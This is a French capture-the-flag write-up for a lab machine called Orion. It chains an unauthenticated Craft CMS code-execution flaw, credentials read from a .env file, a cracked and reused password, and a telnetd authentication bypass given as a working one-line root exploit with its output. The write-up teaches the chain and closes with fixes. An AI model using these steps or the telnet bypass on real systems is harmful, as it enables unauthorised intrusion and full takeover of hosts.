Orion

Trois maillons, trois erreurs distinctes : un CMS non mis à jour, un mot de passe réutilisé, et un service d'accès distant obsolète laissé en écoute.

La chaîne en cinq lignes

Le résumé avant le détail, pour que quelqu'un qui ne fera pas la machine comprenne quand même de quoi il s'agit.

  • Un domaine à résoudre localement avant de pouvoir atteindre le site
  • Un CraftCMS vulnérable à CVE-2025-32432, qui mène à l'exécution de code à distance
  • Le fichier d'environnement par défaut, qui expose les identifiants MySQL
  • Un mot de passe cassable en base, réutilisé pour l'accès SSH
  • Une version vulnérable de telnetd, CVE-2026-24061, qui permet un contournement d'authentification

Reconnaissance

Nmap ne montre que deux ports ouverts : 22 (SSH) et 80 (Nginx), qui redirige vers orion.htb une fois le domaine ajouté localement.

Identifier le CMS et sa version

Le répertoire /admin révèle Craft CMS, et la page de connexion donne le numéro de version exact. 

# Détection du CMS et de sa version exacte
curl -s http://orion.htb/admin/login | grep -i 'Craft CMS'
→ Version exposée : Craft CMS 5.6.16

Cette version est concernée par CVE-2025-32432, une exécution de code arbitraire exploitable sans authentification préalable.

Exécution de code

La faille se situe dans le contrôleur de génération de transformations d'images (/index.php?p=actions/assets/generate-transform). En combinant une injection de code PHP dans le fichier de session et une désérialisation non sécurisée de classes, l'application en vient à évaluer des commandes système arbitraires. 

# Requête ciblant le contrôleur d'assets Craft CMS
POST /index.php?p=actions/assets/generate-transform HTTP/1.1
Host: orion.htb
Content-Type: application/json

# Résultat : session interactive sous l'identité www-data

Passage utilisateur

Le fichier /html/craft/.env contient les identifiants MySQL en clair (root:SuperSecureCraft123Pass!). La table users livre un hash bcrypt pour le compte adam, cassable avec la liste rockyou : le mot de passe en clair est darkangel, réutilisable directement en SSH.

Élévation de privilèges

Un service Telnet (GNU inetutils 2.7) écoute en local sur le port 23. Il est concerné par CVE-2026-24061 : en injectant l'argument -f root dans la variable d'environnement USER transmise au binaire login, on contourne purement et simplement l'authentification. 

# Vérification du binaire Telnet vulnérable
telnet --version
→ telnet (GNU inetutils) 2.7

# Commande d'élévation immédiate vers le compte root
USER="-f root" telnet -a 127.0.0.1
Trying 127.0.0.1...
Connected to 127.0.0.1.
root@orion:~# id
→ uid=0(root) gid=0(root) groups=0(root)

Ce que j'en retiens

Trois maillons, trois familles de problèmes différentes : un CMS non mis à jour exposé sans authentification, un mot de passe de dictionnaire réutilisé entre deux services, et un démon historique laissé actif en local alors qu'il n'a plus sa place. Les correctifs sont à la hauteur : mettre à jour Craft CMS au-delà de la 5.6.16, désactiver purement et simplement Telnet (ou appliquer le correctif pour CVE-2026-24061 sur inetutils), et imposer une politique de mots de passe qui exclut les termes de dictionnaire comme darkangel.
